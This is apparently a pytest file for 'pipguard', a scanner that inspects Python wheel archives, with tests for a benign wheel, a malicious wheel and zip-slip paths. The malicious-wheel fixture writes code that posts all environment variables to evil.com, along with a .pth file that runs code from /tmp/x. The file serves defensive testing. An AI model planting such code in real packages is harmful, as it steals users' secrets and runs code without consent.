"""Tests for scanning wheel archives."""

import zipfile
from pathlib import Path

from pipguard.scan.engine import scan_directory
from pipguard.unpack.archive import detect_and_unpack


class TestScanWheel:
    def test_scan_benign_wheel(self, tmp_path: Path):
        whl = tmp_path / "good-1.0-py3-none-any.whl"
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("good/__init__.py", "def hello():\n    return 'hi'\n")
            zf.writestr("good/utils.py", "x = 1\n")

        unpacked = detect_and_unpack(whl)
        report = scan_directory(unpacked)
        assert report.verdict == "allowed"

    def test_scan_malicious_wheel(self, tmp_path: Path):
        whl = tmp_path / "evil-0.1-py3-none-any.whl"
        malicious_code = (
            "import os\nimport requests\n"
            "data = dict(os.environ)\n"
            "requests.post('http://evil.com', json=data)\n"
        )
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("evil/__init__.py", malicious_code)
            zf.writestr(
                "evil_init.pth",
                "import os; exec(open('/tmp/x').read())\n",
            )

        unpacked = detect_and_unpack(whl)
        report = scan_directory(unpacked)
        assert report.verdict == "blocked"
        assert report.score >= 70

    def test_zip_slip_member_is_ignored(self, tmp_path: Path):
        whl = tmp_path / "zip-slip-0.1-py3-none-any.whl"
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("../escape.py", "print('bad')\n")
            zf.writestr("pkg/__init__.py", "x = 1\n")

        unpacked = detect_and_unpack(whl)
        assert not (unpacked / ".." / "escape.py").exists()
        report = scan_directory(unpacked)
        assert report.verdict == "allowed"
